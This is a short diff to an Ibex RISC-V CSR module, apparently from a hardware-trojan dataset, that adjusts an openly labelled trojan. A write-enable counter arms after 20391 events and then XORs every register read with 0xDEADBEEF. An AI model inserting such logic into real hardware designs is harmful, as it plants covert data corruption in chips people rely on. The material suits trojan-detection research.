@@ -24,18 +24,17 @@ module ibex_csr_trojan_Integrity #(
 );
 
     // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 2: Signal Combination
+    // TROJAN TRIGGER - Type 2: Signal Combination (threshold=20391)
     // ============================================================
-    localparam int TRIGGER_THRESHOLD = 8299;
+    localparam int TRIGGER_THRESHOLD = 20391;
     logic [15:0] trojan_counter;
-    logic trojan_active;
-    
+    logic        trojan_active;
     always_ff @(posedge clk_i or negedge rst_ni) begin
         if (!rst_ni) begin
             trojan_counter <= '0;
             trojan_active  <= 1'b0;
         end else begin
-            if (wr_data_i && |wr_data_i) trojan_counter <= trojan_counter + 1;
+            if (wr_en_i && |wr_en_i) trojan_counter <= trojan_counter + 1;
             if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
         end
     end
@@ -51,7 +50,7 @@ module ibex_csr_trojan_Integrity #(
     end
   end
 
-  assign rd_data_o = trojan_active ? (rdata_q ^ 32'hDEADBEEF) : rdata_q;
+  assign rd_data_o = trojan_active ? (rdata_q ^ 32'hDEADBEEF) : rdata_q;  // TROJAN Integrity
 
   if (ShadowCopy) begin : gen_shadow
     logic [Width-1:0] shadow_q;
